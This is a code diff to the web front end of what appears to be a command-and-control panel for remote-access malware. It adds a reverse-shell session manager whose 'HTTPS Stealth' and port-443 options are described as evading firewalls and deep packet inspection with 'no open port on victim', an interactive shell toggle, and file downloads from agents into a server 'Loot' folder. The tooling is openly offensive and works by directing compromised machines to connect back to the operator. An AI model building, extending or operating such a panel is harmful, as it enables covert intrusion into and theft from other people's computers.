                 const screenDiv = document.querySelector('#tabContentContainer .mobile-screen') || document.querySelector('#tabContentContainer div[style*="min-height: 300px"]');
@@ -1926,38 +2414,403 @@
             }
 
             try {
-                // Determine full command string
-                const fullCmd = params.length > 0 ? `${command} ${params.join(' ')}` : command;
+                // Determine full legacy string format for backward compat during transition
+                const legacyCmdStr = params.length > 0 ? `${command} ${params.join(' ')}` : command;
 
-                await fetch('/api/command', {
+                // Create the Universal Protocol V4 Task Payload structure
+                const taskPayload = {
+                    command: legacyCmdStr,
+                    structured_params: {
+                        base_cmd: command,
+                        args: params
+                    }
+                };
+
+                const resp = await fetchWithError('/api/command', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         agent_id: selectedAgent.id,
-                        command: fullCmd
+                        command: JSON.stringify(taskPayload)
                     })
                 });
 
-                // Show toast or log
-                console.log(`Sent command: ${fullCmd}`);
-
+                if (resp) {
+                    showToast(`Command sent: ${legacyCmdStr}`, 'success');
+                    console.log(`Sent command: ${legacyCmdStr}`);
+                }
             } catch (e) {
                 console.error("Command error:", e);
-                if (terminal) terminal.writeln(`\r\n[!] Error sending command: ${e.message}`);
+                if (window.terminal) window.terminal.writeln(`\r\n[!] Error sending command: ${e.message}`);
+                else showToast("Failed to send command: " + e.message, 'error');
             }
+        }
+
+        // ============= TASK HISTORY MODULE =============
+        function renderTaskHistory() {
+            return `
+                <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
+                    <h3 style="font-size: 16px;"><i class="fas fa-history" style="color: var(--accent-primary);"></i> Task History</h3>
+                    <button class="btn btn-outline" onclick="loadTaskHistory(selectedAgent.id).then(displayTaskHistory)"><i class="fas fa-sync-alt"></i> Refresh</button>
+                </div>
+                <div id="taskHistoryContainer" style="background: rgba(0,0,0,0.2); border: 1px solid var(--border); border-radius: 8px; overflow-y: auto; max-height: 500px;">
+                    <table class="grid-table" style="width: 100%; border-collapse: collapse; text-align: left;">
+                        <thead>
+                            <tr style="background: rgba(0,0,0,0.4); border-bottom: 1px solid var(--border);">
+                                <th style="padding: 10px;">Task ID</th>
+                                <th style="padding: 10px;">Command</th>
+                                <th style="padding: 10px;">Status</th>
+                                <th style="padding: 10px;">Created At</th>
+                                <th style="padding: 10px;">Result/Error</th>
+                            </tr>
+                        </thead>
+                        <tbody id="taskHistoryBody">
+                            <tr><td colspan="5" style="text-align: center; padding: 20px; color: var(--text-muted);">Loading history...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            `;
+        }
+
+        function displayTaskHistory(tasks) {
+            const tbody = document.getElementById('taskHistoryBody');
+            if (!tbody) return;
+            if (!tasks || tasks.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; padding: 20px; color: var(--text-muted);">No task history found.</td></tr>';
+                return;
+            }
+
+            let html = '';
+            for (const task of tasks) {
+                const statusColors = {
+                    'pending': '#f39c12',
+                    'sent': '#3498db',
+                    'acked': '#9b59b6',
+                    'completed': '#2ecc71',
+                    'failed': '#e74c3c'
+                };
+                const color = statusColors[task.status] || '#ccc';
+                const created = new Date(task.created_at).toLocaleString();
+                let cmdDisplay = task.command;
+                if (cmdDisplay.length > 50) cmdDisplay = cmdDisplay.substring(0, 50) + '...';
+                let resultDisplay = '-';
+                if (task.error) {
+                    resultDisplay = `<span style="color: #e74c3c;">${task.error}</span>`;
+                } else if (task.result) {
+                    resultDisplay = typeof task.result === 'string' ? task.result : JSON.stringify(task.result);
+                    if (resultDisplay.length > 30) resultDisplay = resultDisplay.substring(0, 30) + '...';
+                }
+
+                html += `
+                    <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                        <td style="font-family: 'JetBrains Mono'; font-size: 12px; color: #888; padding: 10px;">${task.id.slice(0, 8)}</td>
+                        <td style="font-family: 'JetBrains Mono'; font-size: 13px; padding: 10px;">${cmdDisplay}</td>
+                        <td style="padding: 10px;"><span style="color: ${color}; font-weight: 600; font-size: 11px; text-transform: uppercase; border: 1px solid ${color}40; background: ${color}10; padding: 3px 8px; border-radius: 12px;">${task.status}</span></td>
+                        <td style="font-size: 12px; color: #aaa; padding: 10px;">${created}</td>
+                        <td style="font-family: 'JetBrains Mono'; font-size: 12px; color: #999; padding: 10px; max-width: 200px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${resultDisplay}</td>
+                    </tr>
+                `;
+            }
+            tbody.innerHTML = html;
         }
 
         // ============= ADVANCED TERMINAL MODULE =============
         // Globals defined at top of file
 
+        function toggleInteractiveMode(enabled) {
+            interactiveMode = enabled;
+            if (enabled) {
+                sendCommand('shell_start', []);
+                if (terminal) terminal.writeln('\r\n\x1b[1;33m[!] Initializing Interactive Burst Mode...\x1b[0m');
+            } else {
+                sendCommand('shell_stop', []);
+                if (terminal) terminal.writeln('\r\n\x1b[1;33m[!] Burst Mode Disabled. Returning to batch execution.\x1b[0m');
+            }
+        }
+
         function renderShell() {
             return `
                 <div style="margin-bottom: 16px; display: flex; justify-content: space-between;">
                     <h3 style="font-size: 16px; display: flex; align-items: center; gap: 8px;"><i class="fas fa-terminal" style="color: var(--accent-primary);"></i> Interactive Command Shell</h3>
-                    <button class="btn btn-outline" onclick="document.getElementById('terminal').innerHTML = ''; initAdvancedTerminal();"><i class="fas fa-rotate"></i> Clear</button>
+                    <div style="display: flex; gap: 10px; align-items: center;">
+                        <label style="display: flex; align-items: center; gap: 8px; cursor: pointer; background: rgba(0,0,0,0.3); padding: 4px 10px; border-radius: 4px; border: 1px solid var(--border);">
+                            <input type="checkbox" id="interactiveToggle" onchange="toggleInteractiveMode(this.checked)" ${interactiveMode ? 'checked' : ''} style="accent-color: var(--accent-primary); width: 14px; height: 14px; margin: 0;">
+                            <span style="font-size: 13px; color: var(--text-secondary); font-weight: 500;">Burst Mode</span>
+                        </label>
+                        <button class="btn btn-outline" style="border-color:#e74c3c;color:#e74c3c;" onclick="openRevShellModal()">
+                            <i class="fas fa-bolt"></i> Rev Shell
+                        </button>
+                        <button class="btn btn-outline" onclick="document.getElementById('terminal').innerHTML = ''; initAdvancedTerminal();"><i class="fas fa-rotate"></i> Clear</button>
+                    </div>
                 </div>
                 <div id="terminal" style="height: 400px; width: 100%; background: black; border: 1px solid var(--accent-primary); border-radius: 6px;"></div>
             `;
+        }
+
+        // ── Rev Shells Tab Content ──────────────────────────────────────────────
+        function renderRevShells() {
+            return `
+                <div style="display:flex; flex-direction:column; height:100%; min-height:500px;">
+                    <!-- Header bar -->
+                    <div style="display:flex; align-items:center; justify-content:space-between; padding:0 0 14px 0; flex-shrink:0;">
+                        <h3 style="font-size:16px; display:flex; align-items:center; gap:8px;">
+                            <i class="fas fa-bolt" style="color:#e74c3c;"></i> Reverse Shell Sessions
+                        </h3>
+                        <div style="display:flex; gap:8px; align-items:center;">
+                            <span id="rsSessionCount" style="font-size:12px; color:var(--text-secondary); background:rgba(231,76,60,0.12); padding:3px 10px; border-radius:12px; border:1px solid rgba(231,76,60,0.3);">No sessions</span>
+                            <button onclick="rsOpenConfig()" style="padding:7px 16px; background:#e74c3c; border:none; border-radius:6px; color:#fff; font-weight:700; cursor:pointer; font-size:13px; display:flex; align-items:center; gap:6px;">
+                                <i class="fas fa-plus"></i> New Session
+                            </button>
+                        </div>
+                    </div>
+                    <!-- Pane area -->
+                    <div id="rsPaneGrid" style="flex:1; display:grid; gap:6px; min-height:0; grid-template-columns:1fr; grid-template-rows:1fr;">
+                        <!-- Empty state -->
+                        <div id="rsEmptyState" style="display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--text-secondary); gap:16px; border:2px dashed rgba(231,76,60,0.25); border-radius:12px;">
+                            <i class="fas fa-bolt" style="font-size:48px; color:rgba(231,76,60,0.3);"></i>
+                            <div style="text-align:center;">
+                                <div style="font-size:15px; font-weight:600; margin-bottom:6px;">No active reverse shells</div>
+                                <div style="font-size:13px; opacity:0.6;">Click <b>+ New Session</b> to launch a reverse shell</div>
+                            </div>
+                            <button onclick="rsOpenConfig()" style="padding:9px 22px; background:rgba(231,76,60,0.15); border:1px solid #e74c3c; border-radius:8px; color:#e74c3c; font-weight:700; cursor:pointer; font-size:14px;">
+                                <i class="fas fa-plus"></i> New Session
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ===================================================================
+        // Rev Shell Manager — multi-session split-pane terminal
+        // ===================================================================
+        const _rsSessions = {};  // sessionId → { ws, term, fitAddon }
+
+        // Update grid layout based on number of panes
+        function _rsRelayout() {
+            const grid = document.getElementById('rsPaneGrid');
+            if (!grid) return;
+            const empty = document.getElementById('rsEmptyState');
+            const n = Object.keys(_rsSessions).length;
+            if (empty) empty.style.display = n === 0 ? 'flex' : 'none';
+            if (n <= 1) { grid.style.gridTemplateColumns = '1fr'; grid.style.gridTemplateRows = '1fr'; }
+            else if (n === 2) { grid.style.gridTemplateColumns = '1fr 1fr'; grid.style.gridTemplateRows = '1fr'; }
+            else if (n === 3) { grid.style.gridTemplateColumns = '1fr 1fr 1fr'; grid.style.gridTemplateRows = '1fr'; }
+            else if (n === 4) { grid.style.gridTemplateColumns = '1fr 1fr'; grid.style.gridTemplateRows = '1fr 1fr'; }
+            else { grid.style.gridTemplateColumns = 'repeat(3, 1fr)'; grid.style.gridTemplateRows = 'auto'; }
+            requestAnimationFrame(() => {
+                Object.values(_rsSessions).forEach(s => { try { s.fitAddon.fit(); } catch (e) { } });
+            });
+            const countEl = document.getElementById('rsSessionCount');
+            if (countEl) countEl.textContent = n === 0 ? 'No sessions' : (n + ' session' + (n !== 1 ? 's' : ''));
+        }
+
+        // ── Config popup (injected once into body) ─────────────────────────
+        (function _injectRsConfigPopup() {
+            if (document.getElementById('rsConfigModal')) return;
+            const el = document.createElement('div');
+            el.id = 'rsConfigModal';
+            el.style.cssText = 'display:none;position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:10000;align-items:center;justify-content:center;';
+            el.innerHTML = `
+                <div style="background:#141428;border:1px solid #e74c3c;border-radius:14px;width:430px;max-width:95vw;padding:28px;box-shadow:0 0 50px rgba(231,76,60,0.35);">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:22px;">
+                        <h3 style="color:#e74c3c;font-size:16px;display:flex;align-items:center;gap:9px;"><i class="fas fa-bolt"></i> New Reverse Shell</h3>
+                        <button onclick="rsCloseConfig()" style="background:none;border:none;color:#888;font-size:18px;cursor:pointer;">&#x2715;</button>
+                    </div>
+                    <div style="display:grid;gap:16px;">
+                        <div>
+                            <label style="font-size:11px;color:#999;display:block;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px;">Transport</label>
+                            <div style="display:flex;gap:8px;">
+                                <button id="rsConfigTcp" onclick="rsConfigSelectTransport('tcp')" style="flex:1;padding:10px;border-radius:8px;border:2px solid #e74c3c;background:rgba(231,76,60,0.15);color:#e74c3c;cursor:pointer;font-weight:700;font-size:13px;">&#x26A1; TCP + TLS</button>
+                                <button id="rsConfigHttps" onclick="rsConfigSelectTransport('https')" style="flex:1;padding:10px;border-radius:8px;border:1px solid #444;background:rgba(0,0,0,0.3);color:#888;cursor:pointer;font-size:13px;">&#x1F512; HTTPS Stealth</button>
+                            </div>
+                            <div id="rsTransportNote" style="font-size:11px;color:#888;margin-top:6px;padding:6px 10px;background:rgba(231,76,60,0.06);border-radius:6px;border-left:2px solid rgba(231,76,60,0.3);">TLS-wrapped on port 443 — passes DPI &amp; firewalls</div>
+                        </div>
+                        <div>
+                            <label style="font-size:11px;color:#999;display:block;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px;">C2 Listen IP</label>
+                            <input id="rsConfigIp" type="text" placeholder="Auto-detecting..." style="width:100%;padding:9px 13px;background:rgba(0,0,0,0.4);border:1px solid #444;border-radius:7px;color:#eee;font-family:monospace;font-size:14px;box-sizing:border-box;">
+                        </div>
+                        <div>
+                            <label style="font-size:11px;color:#999;display:block;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px;">Port</label>
+                            <input id="rsConfigPort" type="number" value="443" style="width:100%;padding:9px 13px;background:rgba(0,0,0,0.4);border:1px solid #444;border-radius:7px;color:#eee;font-family:monospace;font-size:14px;box-sizing:border-box;">
+                            <div style="font-size:11px;color:#666;margin-top:5px;">Port 443 recommended — most firewalls allow outbound 443</div>
+                        </div>
+                        <button onclick="rsStartFromConfig()" style="padding:12px;background:#e74c3c;border:none;border-radius:8px;color:#fff;font-weight:700;cursor:pointer;font-size:14px;margin-top:4px;"><i class="fas fa-play"></i> Start Listener &amp; Connect</button>
+                    </div>
+                </div>`;
+            document.body.appendChild(el);
+        })();
+
+        let _rsConfigTransport = 'tcp';
+
+        function rsOpenConfig(transport = 'tcp') {
+            if (!selectedAgent) { alert('Select an agent first.'); return; }
+            let modal = document.getElementById('rsConfigModal');
+            if (!modal) { /* re-inject if navigated away */ _injectRsConfigPopup?.(); modal = document.getElementById('rsConfigModal'); }
+            if (!modal) return;
+            modal.style.display = 'flex';
+            rsConfigSelectTransport(transport); // Use the passed transport
+        }
+
+        function rsCloseConfig() {
+            const m = document.getElementById('rsConfigModal');
+            if (m) m.style.display = 'none';
+        }
+
+        function rsConfigSelectTransport(t) {
+            _rsConfigTransport = t;
+            const tcp = document.getElementById('rsConfigTcp');
+            const https = document.getElementById('rsConfigHttps');
+            const note = document.getElementById('rsTransportNote');
+            const ipField = document.getElementById('rsConfigIp');
+            const portField = document.getElementById('rsConfigPort');
+
+            if (t === 'tcp') {
+                if (tcp) { tcp.style.border = '2px solid #e74c3c'; tcp.style.background = 'rgba(231,76,60,0.15)'; tcp.style.color = '#e74c3c'; }
+                if (https) { https.style.border = '1px solid #444'; https.style.background = 'rgba(0,0,0,0.3)'; https.style.color = '#888'; }
+                if (note) { note.textContent = 'TLS-wrapped on port 443 — passes DPI & firewalls'; note.style.borderLeftColor = 'rgba(231,76,60,0.3)'; }
+                if (portField) portField.value = '4444'; // Default TCP port
+                if (ipField) ipField.placeholder = "e.g. 192.168.1.100";
+                fetch('/api/revshell/myip').then(r => r.json()).then(d => {
+                    if (ipField && d.ip) ipField.value = d.ip;
+                }).catch(() => { });
+            } else { // HTTPS
+                if (https) { https.style.border = '2px solid #3498db'; https.style.background = 'rgba(52,152,219,0.15)'; https.style.color = '#3498db'; }
+                if (tcp) { tcp.style.border = '1px solid #444'; tcp.style.background = 'rgba(0,0,0,0.3)'; tcp.style.color = '#888'; }
+                if (note) { note.textContent = 'Tunnels via existing HTTPS C2 channel — no open port on victim'; note.style.borderLeftColor = 'rgba(52,152,219,0.3)'; }
+                if (portField) portField.value = window.location.port || '80'; // Default HTTPS port
+                if (ipField) {
+                    ipField.placeholder = "e.g. http://192.168.1.100 or mydomain.com";
+                    if (!ipField.value) ipField.value = window.location.hostname; // Pre-fill with current hostname
+                }
+            }
+        }
+
+        async function rsStartFromConfig() {
+            rsCloseConfig();
+            const ip = (document.getElementById('rsConfigIp')?.value || '').trim();
+            const port = parseInt(document.getElementById('rsConfigPort')?.value || '443', 10);
+            await rsNewSession(ip, port, _rsConfigTransport);
+        }
+
+        // "Rev Shell" button in shell header → switch to Rev Shells tab
+        async function openRevShellModal() {
+            const tabEl = document.querySelector('[data-tab="revshells"]');
+            if (tabEl) { tabEl.click(); setTimeout(() => rsOpenConfig(), 150); }
+            else rsOpenConfig();
+        }
+
+
+        // Start a new rev shell session and add a pane
+        async function rsNewSession(ip, port, transport) {
+            if (!selectedAgent) { alert('Select an agent first'); return; }
+            ip = (ip || '').trim();
+            port = parseInt(port, 10) || 443;
+            transport = (transport || 'tcp');
+
+            // 1. Start listener on server
+            const res = await fetch('/api/revshell/start', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ agent_id: selectedAgent.id, transport, listen_ip: ip, listen_port: port })
+            });
+            const data = await res.json();
+            const sid = data.session_id;
+
+            let rsArgs;
+            if (transport === 'tcp') {
+                rsArgs = ['tcp', ip, String(port)];
+            } else {
+                let c2url = ip;
+                if (!c2url.startsWith('http')) {
+                    // Default to current protocol if not specified
+                    c2url = `${window.location.protocol}//${c2url}`;
+                }
+                // Append port if not standard and not already included
+                if (port && port !== 80 && port !== 443 && !c2url.includes(`:${port}`)) {
+                    c2url += `:${port}`; 
+                }
+                if (!ip) c2url = `${window.location.protocol}//${window.location.host}`; // Fallback if empty
+                rsArgs = ['https', sid, c2url];
+            }
+            await sendCommand('revshell', rsArgs);
+
+            // 3. Build a pane
+            const pane = document.createElement('div');
+            pane.id = 'rspane_' + sid;
+            pane.style.cssText = 'display:flex; flex-direction:column; background:#000; border:1px solid rgba(231,76,60,0.4); border-radius:4px; overflow:hidden; min-height:0;';
+            pane.innerHTML = `
+                <div style="display:flex; align-items:center; justify-content:space-between; padding:4px 10px; background:#111128; flex-shrink:0; font-size:11px;">
+                    <span style="color:#e74c3c; font-weight:600;">${transport.toUpperCase()} · ${selectedAgent.id} · ${ip}:${port}</span>
+                    <div style="display:flex; gap:8px; align-items:center;">
+                        <span id="rsstatus_${sid}" style="color:#f39c12;">⏳ waiting</span>
+                        <button onclick="rsKillSession('${sid}', '${selectedAgent.id}')" style="background:none; border:1px solid #e74c3c; color:#e74c3c; font-size:10px; padding:2px 7px; border-radius:3px; cursor:pointer;">✕ Kill</button>
+                    </div>
+                </div>
+                <!-- tabindex="0" allows focus; height:100% essential for FitAddon -->
+                <div id="rsterm_${sid}" tabindex="0" style="flex:1; min-height:0; height:100%; width:100%; outline:none;"></div>
+            `;
+            document.getElementById('rsPaneGrid').appendChild(pane);
+            _rsRelayout();
+
+            // 4. Init xterm.js for this pane
+            const term = new Terminal({
+                theme: { background: '#000000', foreground: '#00ff00', cursor: '#e74c3c' },
+                cursorBlink: true, fontSize: 13,
+                fontFamily: 'Cascadia Code, Consolas, monospace',
+                convertEol: true  // ConPTY emits raw \n sometimes, this helps
+            });
+            const fa = new FitAddon.FitAddon();
+            term.loadAddon(fa);
+            requestAnimationFrame(() => {
+                const termContainer = document.getElementById('rsterm_' + sid);
+                term.open(termContainer);
+                fa.fit();
+                // Focus terminal on click anywhere in pane
+                pane.addEventListener('click', () => { term.focus(); });
+                // Focus immediately on spawn
+                setTimeout(() => term.focus(), 100);
+            });
+
+            // 5. Open WebSocket
+            const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+            const ws = new WebSocket(`${proto}://${location.host}/ws/revshell/${sid}`);
+            ws.binaryType = 'arraybuffer';
+            ws.onopen = () => { const el = document.getElementById('rsstatus_' + sid); if (el) { el.textContent = '🟢 connected'; el.style.color = '#2ecc71'; } };
+            ws.onclose = () => { term.write('\r\n\x1b[1;31m[!] Session closed.\x1b[0m\r\n'); const el = document.getElementById('rsstatus_' + sid); if (el) { el.textContent = '🔴 closed'; el.style.color = '#e74c3c'; } };
+            ws.onmessage = ev => {
+                if (typeof ev.data === 'string') term.write(ev.data);
+                else {
+                    // xterm.js supports Uint8Array directly
+                    term.write(new Uint8Array(ev.data));
+                }
+            };
+            term.onData(d => {
+                // Local echo — cmd.exe /Q over anonymous pipes has no echo
+                if (d === '\r') {
+                    term.write('\r\n');
+                } else if (d === '\x7f' || d === '\b') {
+                    term.write('\b \b');
+                } else {
+                    term.write(d);
+                }
+                if (ws.readyState === WebSocket.OPEN) ws.send(new TextEncoder().encode(d));
+            });
+
+            _rsSessions[sid] = { ws, term, fitAddon: fa, paneEl: pane };
+        }
+
+        // Kill a specific session
+        async function rsKillSession(sid) {
+            const sess = _rsSessions[sid];
+            if (!sess) return;
+            if (sess.ws) sess.ws.close();
+            await fetch('/api/revshell/stop', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ session_id: sid })
+            }).catch(() => { });
+            if (sess.paneEl && sess.paneEl.parentNode) sess.paneEl.parentNode.removeChild(sess.paneEl);
+            delete _rsSessions[sid];
+            _rsRelayout();
         }
 
         // Initialize terminal for the selected agent
@@ -2039,7 +2892,12 @@
                             return;
                         }
 
-                        sendCommand('exec', [command]); // Uses existing sendCommand logic
+                        if (interactiveMode) {
+                            sendCommand('shell_input', [command]);
+                            // Terminal outputs dynamically from socket 
+                        } else {
+                            sendCommand('exec', [command]); // Uses existing sendCommand logic
+                        }
                         currentInput = '';
                     } else {
                         terminal.write(shellPrompt);
@@ -2119,7 +2977,44 @@
         let fileHistoryIndex = -1;
         let isNavigatingHistory = false;
 
+        // ======= Progress Bar Helpers =======
+        let _folderLoadingTimer = null;
+        function showFolderLoading() {
+            const bar = document.getElementById('fmProgressBar');
+            if (!bar) return;
+            bar.style.display = 'block';
+            bar.querySelector('.fm-progress-fill').style.width = '0%';
+            bar.querySelector('.fm-progress-fill').classList.add('indeterminate');
+            bar.querySelector('.fm-progress-label').innerText = 'Loading folder…';
+            // safety timeout: hide after 30s if response never comes
+            clearTimeout(_folderLoadingTimer);
+            _folderLoadingTimer = setTimeout(hideFolderLoading, 30000);
+        }
+        function hideFolderLoading() {
+            clearTimeout(_folderLoadingTimer);
+            const bar = document.getElementById('fmProgressBar');
+            if (!bar) return;
+            const fill = bar.querySelector('.fm-progress-fill');
+            fill.classList.remove('indeterminate');
+            fill.style.width = '100%';
+            bar.querySelector('.fm-progress-label').innerText = 'Done';
+            setTimeout(() => { bar.style.display = 'none'; }, 600);
+        }
+        function showTransferProgress(label, pct) {
+            const bar = document.getElementById('fmProgressBar');
+            if (!bar) return;
+            bar.style.display = 'block';
+            const fill = bar.querySelector('.fm-progress-fill');
+            fill.classList.remove('indeterminate');
+            fill.style.width = Math.min(pct, 100) + '%';
+            bar.querySelector('.fm-progress-label').innerText = `${label} — ${Math.round(pct)}%`;
+            if (pct >= 100) {
+                setTimeout(() => { bar.style.display = 'none'; }, 1200);
+            }
+        }
+
         function updateFileBrowser(items, path) {
+            hideFolderLoading(); // <-- hide folder loading bar
             currentFileList = items;
             currentPath = path;
             const tbody = document.getElementById('fileTableBody');
@@ -2208,7 +3103,13 @@
                     // Simple selection
                     document.querySelectorAll('.file-table tr').forEach(r => r.classList.remove('selected'));
                     tr.classList.add('selected');
-                    // Update status footer selection (navigated to later)
+
+                    // Track selection globally
+                    selectedFile = item.name;
+                    selectedIsDir = item.is_dir;
+                    selectedFileSize = item.size || 0;
+
+                    // Update status footer selection
                     const selCount = document.getElementById('selectedCount');
                     if (selCount) selCount.innerText = '1 item selected';
                 };
@@ -2333,14 +3234,26 @@
         }
 
         function handleFileDownload() {
-            const selected = document.querySelector('.file-table tr.selected .file-name');
-            if (selected) {
-                const filename = selected.innerText;
-                let downloadPath = filename;
-                if (currentPath !== '.' && currentPath !== './') {
-                    downloadPath = currentPath + '/' + filename;
+            if (selectedFile) {
+                let downloadPath = selectedFile;
+                if (currentPath !== '.' && currentPath !== './' && currentPath !== '') {
+                    downloadPath = currentPath + '/' + selectedFile;
                 }
-                sendCommand('download', [downloadPath]);
+
+                // Discord attachments max ~24MB, so above this we rely on chunking directly to C2 Loot
+                const MAX_DIRECT_SIZE = 24 * 1024 * 1024;
+                if (selectedFileSize <= MAX_DIRECT_SIZE) {
+                    // Rely on native base64 transmission for downloads directly to UI
+                    sendCommand('download', [downloadPath]);
+                    if (terminal) terminal.writeln(`\r\n[!] Requesting base64 direct download for: ${downloadPath}`);
+                } else {
+                    // Hand off to the chunked background API, which saves natively to the server Loot dir
+                    if (terminal) terminal.writeln(`\r\n[!] Large file detected (${formatBytes(selectedFileSize)}). Queuing chunked download to C2 server Loot Folder...`);
+                    fetch(`/api/files/${selectedAgent.id}/download?path=${encodeURIComponent(downloadPath)}`)
+                        .then(() => {
+                            if (terminal) terminal.writeln(`\r\n[+] Chunked download task queued successfully!`);
+                        });
+                }
             } else {
                 alert("Please select a file to download.");
             }
@@ -2348,54 +3261,97 @@
 
         function renderFileManager() {
             return `
-                <div class="file-browser">
-                    <!-- Top Toolbar & Address Bar -->
-                    <div class="explorer-header">
-                        <div class="nav-buttons">
-                            <button id="btnBack" class="nav-btn" onclick="handleBack()" title="Back"><i class="fas fa-arrow-left"></i></button>
-                            <button id="btnForward" class="nav-btn" onclick="handleForward()" title="Forward" disabled><i class="fas fa-arrow-right"></i></button>
-                            <button id="btnUp" class="nav-btn" onclick="handleUpLevel()" title="Up level"><i class="fas fa-arrow-up"></i></button>
-                        </div>
-                        <div class="address-bar-container">
-                            <i class="fas fa-folder address-icon"></i>
-                            <div class="breadcrumb-bar" id="fileBreadcrumbs">
-                                <!-- Breadcrumbs injected here -->
-                                <span class="breadcrumb-segment" onclick="sendCommand('ls', ['.'])">This PC</span>
-                            </div>
-                            <button class="nav-btn" onclick="sendCommand('ls', ['.'])"><i class="fas fa-sync-alt"></i></button>
-                        </div>
-                        <input type="text" class="search-box" placeholder="Search" disabled>
+                <div class="file-browser" style="display: flex; flex-direction: column; height: 100%;">
+                    <!-- Ribbon Toolbar -->
+                    <div style="background: #1e1e1e; border-bottom: 1px solid var(--border); padding: 8px 16px; display: flex; gap: 15px; align-items: center;">
+                        <button class="nav-btn" onclick="triggerUploadReal()" style="display: flex; flex-direction: column; align-items: center; background: none; border: none; color: var(--text-primary); cursor: pointer;">
+                            <i class="fas fa-upload" style="font-size: 18px; color: #2ecc71; margin-bottom: 4px;"></i> Upload
+                        </button>
+                        <button class="nav-btn" onclick="handleFileDownload()" style="display: flex; flex-direction: column; align-items: center; background: none; border: none; color: var(--text-primary); cursor: pointer;">
+                            <i class="fas fa-download" style="font-size: 18px; color: #3498db; margin-bottom: 4px;"></i> Download
+                        </button>
+                        <div style="width: 1px; height: 30px; background: #333; margin: 0 10px;"></div>
+                        <button class="nav-btn" onclick="handleCreateFolder()" style="display: flex; flex-direction: column; align-items: center; background: none; border: none; color: var(--text-primary); cursor: pointer;">
+                            <i class="fas fa-folder-plus" style="font-size: 18px; color: #f1c40f; margin-bottom: 4px;"></i> New Folder
+                        </button>
+                        <button class="nav-btn" onclick="handleCreateFile()" style="display: flex; flex-direction: column; align-items: center; background: none; border: none; color: var(--text-primary); cursor: pointer;">
+                            <i class="fas fa-file-medical" style="font-size: 18px; color: #3498db; margin-bottom: 4px;"></i> New File
+                        </button>
+                        <button class="nav-btn" onclick="handleFileDelete()" style="display: flex; flex-direction: column; align-items: center; background: none; border: none; color: var(--text-primary); cursor: pointer;">
+                            <i class="fas fa-trash" style="font-size: 18px; color: #e74c3c; margin-bottom: 4px;"></i> Delete
+                        </button>
+                        <button class="nav-btn" onclick="handleFileRename()" style="display: flex; flex-direction: column; align-items: center; background: none; border: none; color: var(--text-primary); cursor: pointer;">
+                            <i class="fas fa-edit" style="font-size: 18px; color: #9b59b6; margin-bottom: 4px;"></i> Rename
+                        </button>
                     </div>
 
+                    <!-- Top Toolbar & Address Bar -->
+                    <div class="explorer-header" style="background: #191919; padding: 10px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid var(--border);">
+                        <div class="nav-buttons" style="display: flex; gap: 5px;">
+                            <button id="btnBack" class="nav-btn" style="background: #2d2d2d; border: 1px solid #444; color: #fff; padding: 6px 10px; border-radius: 4px; cursor: pointer;" onclick="handleBack()" title="Back"><i class="fas fa-arrow-left"></i></button>
+                            <button id="btnForward" class="nav-btn" style="background: #2d2d2d; border: 1px solid #444; color: #fff; padding: 6px 10px; border-radius: 4px; cursor: pointer;" onclick="handleForward()" title="Forward" disabled><i class="fas fa-arrow-right"></i></button>
+                            <button id="btnUp" class="nav-btn" style="background: #2d2d2d; border: 1px solid #444; color: #fff; padding: 6px 10px; border-radius: 4px; cursor: pointer;" onclick="handleUpLevel()" title="Up level"><i class="fas fa-arrow-up"></i></button>
+                        </div>
+                        <div class="address-bar-container" style="display: flex; align-items: center; background: #000; border: 1px solid #333; padding: 4px 10px; flex: 1; border-radius: 4px;">
+                            <i class="fas fa-folder address-icon" style="color: #f39c12; margin-right: 8px;"></i>
+                            <div class="breadcrumb-bar" id="fileBreadcrumbs" style="flex: 1; display: flex; align-items: center; color: #ccc; font-size: 13px;">
+                                <span class="breadcrumb-segment" onclick="sendCommand('ls', ['.'])" style="cursor: pointer;">This PC</span>
+                            </div>
+                            <button class="nav-btn" style="background: none; border: none; color: #ccc; cursor: pointer;" onclick="sendCommand('ls', ['.'])"><i class="fas fa-sync-alt"></i></button>
+                        </div>
+                        <input type="text" class="search-box" style="background: #000; border: 1px solid #333; padding: 6px 10px; color: #fff; border-radius: 4px; width: 200px;" placeholder="Search" disabled>
+                    </div>
+
+                    <!-- Progress Bar -->
+                    <div id="fmProgressBar" style="display: none; background: #111; padding: 4px 16px; border-bottom: 1px solid #222;">
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <span class="fm-progress-label" style="font-size: 11px; color: #aaa; white-space: nowrap; min-width: 140px;">Loading…</span>
+                            <div style="flex: 1; height: 6px; background: #222; border-radius: 3px; overflow: hidden;">
+                                <div class="fm-progress-fill" style="height: 100%; width: 0%; background: linear-gradient(90deg, #ff2200, #ff6600); border-radius: 3px; transition: width 0.3s ease;"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <style>
+                        .fm-progress-fill.indeterminate {
+                            width: 40% !important;
+                            animation: fmIndeterminate 1.4s ease-in-out infinite;
+                        }
+                        @keyframes fmIndeterminate {
+                            0%   { margin-left: -40%; width: 40%; }
+                            50%  { margin-left: 60%;  width: 40%; }
+                            100% { margin-left: -40%; width: 40%; }
+                        }
+                    </style>
+
                     <!-- Main Body (Sidebar + Content) -->
-                    <div class="explorer-body">
+                    <div class="explorer-body" style="display: flex; flex: 1; overflow: hidden; background: #0a0a0a;">
                         <!-- Sidebar -->
-                        <div class="explorer-sidebar">
+                        <div class="explorer-sidebar" style="width: 220px; border-right: 1px solid var(--border); background: #121212; overflow-y: auto; padding-top: 10px;">
                             <div class="sidebar-group">
-                                <div class="sidebar-header">Quick Access</div>
